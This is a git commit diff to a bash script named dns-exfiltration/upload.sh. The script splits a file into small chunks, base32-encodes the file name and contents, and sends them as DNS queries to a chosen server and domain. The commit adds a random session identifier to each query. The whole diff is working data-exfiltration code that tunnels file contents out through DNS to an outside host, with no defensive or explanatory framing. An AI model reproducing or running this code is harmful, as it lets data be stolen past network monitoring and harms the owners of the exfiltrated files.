abceac21636586f90011b289c4c5bc8d97961d41
tinthid <dev@tinthid.com>
2024-05-15 18:24:29 +0700

    add random_id to upload.sh

--- dns-exfiltration/upload.sh
+++ dns-exfiltration/upload.sh
@@ -14,6 +14,7 @@ main () {
     # Get the size of the file
     file_size=$(stat -c %s "$file")
     chunk_size=20
+    random_id=${RANDOM}
 
     # Calculate the number of chunks
     if [ $(($file_size % $chunk_size)) -eq 0 ]; then
@@ -23,22 +24,21 @@ main () {
     fi
 
     encoded_file_name=$(echo -n "$file" | base32 | sed -r 's/=//g') 
-    dig_req="0.${num_chunks}.${encoded_file_name,,}.${base_domain}"
+    dig_req="${random_id}.0.${num_chunks}.${encoded_file_name,,}.${base_domain}"
     send_query $ip $dig_req
-    # dig @${ip} $dig_req >/dev/null 2>&1 &
 
     # Process the file in blocks
     count=1
     while IFS= read -r -d '' -n $chunk_size block; do
     encoded_chunk=$(echo -n "$block" | base32)
-    dig_req="${count}.${num_chunks}.${encoded_chunk,,}.${base_domain}"
+    dig_req="${random_id}.${count}.${num_chunks}.${encoded_chunk,,}.${base_domain}"
     send_query $ip $dig_req
     count=$((count+1))
     done < "$file"
 
     if [ $(($file_size % $chunk_size)) -ne 0 ]; then
     encoded_chunk=$(tail -c $(($file_size % $chunk_size)) "$file" | base32 | sed -r 's/=//g')
-    dig_req="${count}.${num_chunks}.${encoded_chunk,,}.${base_domain}"
+    dig_req="${random_id}.${count}.${num_chunks}.${encoded_chunk,,}.${base_domain}"
     send_query $ip $dig_req
     fi
 }
